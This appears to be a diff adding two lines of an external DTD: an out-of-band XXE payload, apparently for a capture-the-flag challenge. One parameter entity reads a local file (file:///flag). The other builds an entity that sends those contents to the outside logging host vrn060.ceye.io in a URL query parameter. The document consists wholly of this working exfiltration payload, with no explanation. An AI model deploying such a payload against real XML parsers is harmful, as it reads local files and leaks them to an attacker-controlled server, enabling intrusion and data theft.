@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vrn060.ceye.io?popko=%file;'>">
